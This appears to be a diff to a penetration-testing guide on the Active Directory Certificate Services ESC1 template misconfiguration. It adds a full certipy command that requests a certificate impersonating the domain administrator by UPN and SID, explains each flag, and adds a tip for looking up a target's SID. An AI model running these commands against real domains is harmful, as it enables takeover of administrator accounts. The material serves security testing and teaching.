@@ -1,6 +1,6 @@
 The vulnerability happens when a certificate template has:
 
-1. The certificate template allows the **enrollee to supply subject information**.
+1. The certificate template allows the **enrollee to supply subject information** (The CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is enabled.) 
 2. **Client Authentication** EKU
 3. **Any user** (like `Domain Users`) has **Enroll** rights.
 4. No **manager approval** required
@@ -56,11 +56,24 @@ Exploiting an ESC1 vulnerability typically involves two main steps:
 
 
 
+```bash
+certipy req \
+    -u 'attacker@corp.local' -p 'Passw0rd!' \
+    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+    -ca 'CORP-CA' -template 'VulnTemplate' \
+    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
+```
 
+- `-u 'attacker@corp.local' -p 'Passw0rd!'`: Credentials of the user that can perform the request.
+- `-dc-ip '10.0.0.100'`: IP address of a Domain Controller for DNS lookups if needed.
+- `-target 'CA.CORP.LOCAL' -ca 'CORP-CA'`: Specifies the target CA name and its DNS/hostname.
+- `-template 'VulnTemplate'`: The ESC1 vulnerable template name.
+- `-upn 'administrator@corp.local'`: The UPN of the target user to be embedded in the certificate's SAN (the impersonated user).
+- `-sid 'S-1-5-21-...-500'`: The SID of the target user (Administrator) to be embedded in the certificate's SID extension.
 
-
-
-
+> [!NOTE]
+  💡 : To find the SID and other attributes of a target user like 'administrator', you can use the command: `certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read`
+  
 
 
 
